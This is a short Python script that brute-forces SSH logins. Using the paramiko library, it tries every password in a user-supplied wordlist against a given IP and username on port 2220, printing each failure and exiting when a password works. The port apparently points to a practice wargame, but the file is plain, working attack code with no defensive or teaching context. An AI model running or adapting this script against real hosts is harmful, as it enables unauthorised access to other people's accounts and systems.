import paramiko 
import sys
import time

if len(sys.argv) != 4:
    print("Usage: python3 ssh_brute.py <IP> <username> <wordlist>")
    sys.exit()

ip = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]

try:
    with open(wordlist, "r") as f:
        passwords = f.read().splitlines()
except:
    print("wordlist not found")
    sys.exit()

print(f"Brute forcing SSH on {ip} with the username: {username}")
print("-" * 50)

for password in passwords:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port = 2220 ,username = username, password = password, timeout=3)
        print(f"[Success] Password found: {password}")
        client.close()
        sys.exit()
    except paramiko.AuthenticationException:
        print(f"[Failed] {password}")
    except Exception as e:
        time.sleep(1)
    finally:
        client.close()